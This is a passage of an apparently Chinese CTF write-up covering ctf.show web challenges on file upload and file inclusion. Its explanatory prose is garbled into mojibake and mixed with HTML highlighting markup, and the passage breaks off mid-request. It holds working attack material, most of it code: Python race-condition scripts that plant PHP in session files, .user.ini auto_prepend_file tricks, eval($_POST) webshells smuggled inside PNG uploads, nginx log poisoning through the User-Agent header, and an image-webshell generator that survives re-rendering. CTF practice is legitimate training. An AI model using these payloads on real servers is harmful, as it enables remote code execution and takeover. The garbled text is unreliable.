â€œPHP_SESSION_UPLOAD_PROGRESSâ€<br>5.session.use_strict_mode&#x3D;off</p><p>ç¬¬ä¸€ä¸ªè¡¨ç¤ºå½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œphpå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­<br>ç¬¬äºŒä¸ªè¡¨ç¤ºå½“æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œphpå°†ä¼šç«‹å³æ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹<br>ç¬¬ä¸‰å’Œç¬¬å››ä¸ªprefix+nameå°†è¡¨ç¤ºä¸ºsessionä¸­çš„é”®å<br>ç¬¬äº”ä¸ªè¡¨ç¤ºæˆ‘ä»¬å¯¹Cookieä¸­sessionIDå¯æ§<br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨session.upload_progresså°†æœ¨é©¬å†™å…¥sessionæ–‡ä»¶ï¼Œç„¶ååŒ…å«è¿™ä¸ªsessionæ–‡ä»¶å› ä¸ºsession.use_strict_mode&#x3D;offæ‰€ä»¥sessionçš„æ–‡ä»¶åæˆ‘ä»¬æ˜¯å¯æ§çš„ï¼Œæ¯”å¦‚æ·»åŠ ä¸€ä¸ªCookie:PHPSESSID&#x3D;flag,PHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶sess_flagï¼Œè¿˜æœ‰session.upload_progress.cleanup &#x3D; oné»˜è®¤å¼€å¯æ‰€ä»¥åœ¨æˆ‘ä»¬ä¼ å…¥ä¸€å¥è¯æœ¨é©¬å°±ä¼šè¢«ç«‹å³åˆ é™¤ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç”¨æ¡ä»¶ç«äº‰æ¥è¿›è¡ŒåŒ…å«</p><p>å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://de6906e6-f354-48f4-960d-5a479b6ec627.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;åˆ©ç”¨PHP_SESSION_UPLOAD_PROGRESSå°†æœ¨é©¬å†™å…¥sessionã€‚åœ¨session.upload_progress.name=&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;çš„æ¡ä»¶ä¸‹ä¸Šä¼ æ–‡ä»¶å°±ä¼šæŠŠè¿™æ¬¡ä¸Šä¼ çš„ä¿¡æ¯å­˜å‚¨åœ¨/tmp/sess_flagä¸­&#x27;&#x27;&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac f*&quot;);?&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç”¨æ¥ä¸Šä¼ è¿›è¡Œæ¡ä»¶ç«äº‰&#x27;&#x27;&#x27;</span></span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">10</span>)</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;ä»¥sessionçš„æ–¹å¼postä¸Šä¼ PHPSESSIDå’Œè¦æ‰§è¡Œçš„è¯­å¥&#x27;&#x27;&#x27;</span></span><br><span class="line">        response = session.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>&#125;, data=data, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;dota.txt&#x27;</span>, f)&#125;)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;è¿™é‡ŒçŒœæµ‹sessionæ–‡ä»¶åœ¨tmpç›®å½•ä¸‹&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="string">&#x27;ctf&#x27;</span>:<span class="string">&#x27;/tmp/sess_flag&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;è·å–æ–‡ä»¶åŒ…å«è¿‡åçš„è¿”å›æ•°æ®&#x27;&#x27;&#x27;</span></span><br><span class="line">        response = session.post(url+<span class="string">&#x27;?isVIP=1&#x27;</span>,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;å®ä¾‹åŒ–ä¸‹session&#x27;&#x27;&#x27;</span></span><br><span class="line">    session = requests.session()</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;åˆ›å»ºå¤šä¸ªçº¿ç¨‹,ä¸€ä¸ªthreadå¯¹è±¡ä»£è¡¨ä¸€ä¸ªçº¿ç¨‹&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure></li></ul><h3><span id="æ–‡ä»¶ä¸Šä¼ ">æ–‡ä»¶ä¸Šä¼ </span></h3><p><a href="https://www.dazhuanlan.com/vip_mmles/topics/1547397">.htaccess å’Œ.user.ini é…ç½®æ–‡ä»¶å¦™ç”¨</a></p><ul><li><p>æ ‡ç­¾</p><blockquote><p>æœ‰æ—¶å€™ä¼šå±è”½phpçš„æ ‡ç­¾<?php?></p><p>æˆ‘ä»¬å¯ä»¥ç”¨çŸ­æ ‡ç­¾</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt;<span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;<span class="meta">?&gt;</span>         <span class="comment">//short_open_tags=on</span></span><br><span class="line"></span><br><span class="line">&gt;<span class="meta">&lt;?=</span>(è¡¨è¾¾å¼)<span class="meta">?&gt;</span> ç­‰ä»·äº <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (è¡¨è¾¾å¼)<span class="meta">?&gt;</span> <span class="comment">//æ— é™åˆ¶</span></span><br><span class="line"></span><br><span class="line">&gt;&lt;% <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt;         <span class="comment">//asp_tags=on php_version &lt; 7</span></span><br><span class="line"></span><br><span class="line">&gt;&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>; &lt;/script&gt; <span class="comment">//php_vsesion &lt; 7</span></span><br></pre></td></tr></table></figure></blockquote></li></ul><h4><span id="web153">web153</span></h4><ul><li>ä½¿ç”¨iniç»•è¿‡ï¼Œå…ˆæŠ“åŒ…ä¿®æ”¹ä¸Šä¼ iniæ–‡ä»¶</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1a6d1184-db8d-4671-a858-56d5451f64fd.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>205</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarysSdVv9iA9wMCmOIg</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://1a6d1184-db8d-4671-a858-56d5451f64fd.challenge.ctf.show</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://1a6d1184-db8d-4671-a858-56d5451f64fd.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundarysSdVv9iA9wMCmOIg</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;.user.ini&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">auto_prepend_file = <span class="number">1.</span>png</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundarysSdVv9iA9wMCmOIg--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><p>ç„¶åä¸Šä¼ pngï¼Œå¦‚æœæ²¡æ–‡ä»¶å¤´æ£€æµ‹ï¼Œå°±ç›´æ¥ä¼ pngé‡Œé¢ä¸€å¥è¯ä»£ç ï¼Œå¦åˆ™è¦éšä¾¿æˆªä¸ªå›¾ï¼Œç„¶åä»£ç æ”¾æœ€åã€‚</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="function">Host: 1<span class="title">a6d1184</span>-<span class="title">db8d</span>-4671-<span class="title">a858</span>-56<span class="title">d5451f64fd.challenge.ctf.show</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Length</span>: 205</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>: <span class="title">application</span>/<span class="title">json</span>, <span class="title">text</span>/<span class="title">javascript</span>, */*; <span class="title">q</span>=0.01</span></span><br><span class="line"><span class="function"><span class="title">X</span>-<span class="title">Requested</span>-<span class="title">With</span>: <span class="title">XMLHttpRequest</span></span></span><br><span class="line"><span class="function"><span class="title">User</span>-<span class="title">Agent</span>: <span class="title">Mozilla</span>/5.0 (<span class="title">Macintosh</span>; <span class="title">Intel</span> <span class="title">Mac</span> <span class="title">OS</span> <span class="title">X</span> 10<span class="title">_15_7</span>) <span class="title">AppleWebKit</span>/537.36 (<span class="title">KHTML</span>, <span class="title">like</span> <span class="title">Gecko</span>) <span class="title">Chrome</span>/103.0.0.0 <span class="title">Safari</span>/537.36</span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Type</span>: <span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>; <span class="title">boundary</span>=----<span class="title">WebKitFormBoundarysSdVv9iA9wMCmOIg</span></span></span><br><span class="line"><span class="function"><span class="title">Origin</span>: <span class="title">http</span>://1<span class="title">a6d1184</span>-<span class="title">db8d</span>-4671-<span class="title">a858</span>-56<span class="title">d5451f64fd.challenge.ctf.show</span></span></span><br><span class="line"><span class="function"><span class="title">Referer</span>: <span class="title">http</span>://1<span class="title">a6d1184</span>-<span class="title">db8d</span>-4671-<span class="title">a858</span>-56<span class="title">d5451f64fd.challenge.ctf.show</span>/</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>-<span class="title">Encoding</span>: <span class="title">gzip</span>, <span class="title">deflate</span></span></span><br><span class="line"><span class="function"><span class="title">Accept</span>-<span class="title">Language</span>: <span class="title">zh</span>-<span class="title">CN</span>,<span class="title">zh</span>;<span class="title">q</span>=0.9</span></span><br><span class="line"><span class="function"><span class="title">Connection</span>: <span class="title">close</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------<span class="title">WebKitFormBoundarysSdVv9iA9wMCmOIg</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Disposition</span>: <span class="title">form</span>-<span class="title">data</span>; <span class="title">name</span>=&quot;<span class="title">file</span>&quot;; <span class="title">filename</span>=&quot;1.<span class="title">png</span>&quot;</span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Type</span>: <span class="title">image</span>/<span class="title">png</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;?<span class="title">php</span> <span class="title">eval</span>($<span class="title">_POST</span>[&#x27;<span class="title">x</span>&#x27;]);?&gt;</span></span><br><span class="line"><span class="function">------<span class="title">WebKitFormBoundarysSdVv9iA9wMCmOIg</span>--</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure><h4><span id="web156">web156</span></h4><blockquote><p>[]å¯ä»¥ç”¨{}æ¥ç»•è¿‡ï¼Œ</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// ç­‰ä»·äº</span></span><br><span class="line"><span class="meta">&lt;?=</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4><span id="web157">web157</span></h4><p>ç»è¿‡æµ‹è¯•å‘ç°è¿‡æ»¤æ‰äº†å¤§æ‹¬å·{}ï¼Œ[]ï¼Œï¼›</p><p>æ‰€ä»¥å¯ä»¥è¯´è¿™æ ·åŸºæœ¬æŠŠé©¬ç»™é”æ­»äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä»»æ„æ‰§è¡Œphpï¼Œå°±ç”¨ç³»ç»Ÿå‘½ä»¤æŸ¥çœ‹ä¸€ä¸‹ï¼Œç›´æ¥æ‰¾åˆ°flagæ–‡ä»¶</p><h4><span id="web-159">web 159</span></h4><p>æœ¬é¢˜è¿‡æ»¤æ‰äº†</p><blockquote><p>php</p><p>{}</p><p>[]</p><p>;</p><p>()</p></blockquote><p>æ‰€ä»¥å°±æ— æ³•è°ƒç”¨æ‰€æœ‰çš„å‡½æ•°äº†ï¼Œä½†æ˜¯èƒ½åˆ©ç”¨phpç‰¹æ€§ï¼Œå‘½ä»¤æ‰§è¡Œå¯ä»¥ç”¨&#96;&#96;ï¼ˆåå¼•å·åŒ…æ¶µï¼‰</p><blockquote><?=`nl ../fl*`?></blockquote><h4><span id="web-160">web 160</span></h4><p>ä¸ä¸Šé¢˜ç›¸æ¯”ï¼Œè¿™é¢˜å°†ç©ºæ ¼å’Œ&#96;&#96;åå¼•å·å’Œlogè¿‡æ»¤æ‰äº†ï¼Œæ‰€ä»¥ä¸Šä¼ çš„æ—¶å€™è¦æ³¨æ„ç•¥è¿‡å¤šä½™çš„ç©ºæ ¼ï¼Œlogå¯ä»¥ç”¨ç‚¹å·æ‹¼æ¥ç»•è¿‡ï¼Œä¸”æœ¬é¢˜ä¸èƒ½ä½¿ç”¨ä¸Šé¢˜çš„æ–¹æ³•ï¼Œè€ƒè™‘åˆ°æ—¥å¿—åŒ…å«ã€‚</p><p>é¦–å…ˆä¸Šä¼ <code>.user.ini</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auto_append_file=/var/www/html/upload/<span class="number">1</span>.png</span><br><span class="line">// æˆ–è€…</span><br><span class="line">auto_prepend_file=<span class="number">1</span>.png</span><br></pre></td></tr></table></figure><p>nginxçš„æ—¥å¿—æ–‡ä»¶åœ¨&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logé‡Œå¤´ï¼Œå…ˆçœ‹çœ‹æ—¥å¿—æ–‡ä»¶æœ‰ä»€ä¹ˆï¼Œè¿™é‡Œä¸Šä¼ å†…å®¹ä¸º</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// ç»•è¿‡æ£€æŸ¥</span><br><span class="line">GIF89a</span><br><span class="line">&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br></pre></td></tr></table></figure><p>UAæ”¹ä¸º</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><h4><span id="web162">web162</span></h4><p>å¤§è‡´æ€è·¯å’Œä¸Šé¢˜ç±»ä¼¼,ä¸è¿‡åœ¨ä¸Šä¼ .user.iniçš„æ—¶å€™å‘ç°<code>.</code>è¢«è¿‡æ»¤äº†,å¯ä»¥æŠŠåŒ…å«çš„æ–‡ä»¶ä¸å¸¦åç¼€æ¥ç»•è¿‡</p><p><strong>åŒ…å«æ–‡ä»¶æ³•</strong></p><ul><li>.user.ini</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"></span><br><span class="line"><span class="attr">auto_prepend_file</span>=png</span><br></pre></td></tr></table></figure><ul><li>png</li><li>å–åè„šæœ¬</li></ul><p><strong>åŒ…å«sessionï¼Œæ¡ä»¶ç«äº‰</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">sess = <span class="string">&#x27;abc&#x27;</span> <span class="comment">#ä¹‹å‰ä¸Šä¼ æ—¶è‡ªæ‹Ÿçš„åå­—</span></span><br><span class="line">url1 = <span class="string">&quot;http://2c61d1a6-5b2d-4d20-8367-9d9b9875e436.chall.ctf.show/&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://2c61d1a6-5b2d-4d20-8367-9d9b9875e436.chall.ctf.show/upload&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;yu22x tql&#x27;</span>  <span class="comment">#æ–‡ä»¶åï¼Œéšä¾¿æ”¹å°±è¡Œ</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(): <span class="comment">#ä¸Šä¼ æ–‡ä»¶ç«äº‰è¿‡ç¨‹</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url1, data=data1, files=file, cookies=cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: <span class="comment">#æ¯æ¬¡ç«äº‰å®Œéƒ½è®¿é—®ä¸€ä¸‹url/uoloadçœ‹æœ‰æ²¡æœ‰flag</span></span><br><span class="line">        r = session.get(url2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag=re.<span class="built_in">compile</span>(<span class="string">&#x27;ctfshow&#123;.+&#125;&#x27;</span>) <span class="comment">#æˆ‘åœ¨åšé¢˜çš„æ—¶å€™flagæ ¼å¼å·²ç»æ”¹æˆctfshow&#123;&#125;äº†</span></span><br><span class="line">            <span class="built_in">print</span>(flag.findall(r.text))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">           threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><h4><span id="web-164">web 164</span></h4><p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">å›¾ç‰‡æœ¨é©¬</a></p><p><a href="https://www.jianshu.com/p/744001fd0738">äºŒæ¬¡æ¸²æŸ“åŸç†</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;1.png&#x27;</span>); <span class="comment">#ä¿å­˜åœ¨æœ¬åœ°çš„å›¾ç‰‡é©¬</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#&lt;?=$_GET[0]($_POST[1]);?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡bpå»è®¿é—®å›¾ç‰‡</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/download.php?image=4a47a0db6e60853dedfcfdf08a5ca249.png&amp;0=system</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>113f313e-076e-4fc6-9c58-07e68e75cc22.challenge.ctf.show</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: 